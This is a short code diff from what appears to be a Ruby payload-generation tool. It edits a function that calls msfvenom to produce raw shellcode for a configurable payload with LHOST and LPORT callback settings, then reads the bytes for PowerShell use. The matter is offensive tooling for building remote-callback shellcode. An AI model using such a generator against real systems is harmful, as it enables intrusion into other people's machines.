@@ -83,7 +83,7 @@ def gen_PS_shellcode()
     resultsS = ""
 
     #generate the shellcode via msfvenom and write to a temp txt file
-    system("msfvenom -p #{$lpayload} LHOST=#{$lhost} LPORT=#{$lport} -f raw > raw_shellcode_temp")
+    system("msfvenom -p #{$lpayload} LHOST=#{$lhost} LPORT=#{$lport} -s 341 -f raw > raw_shellcode_temp")
 
     #taking raw shellcode, each byte goes into array
     File.open('raw_shellcode_temp').each_byte do |b|
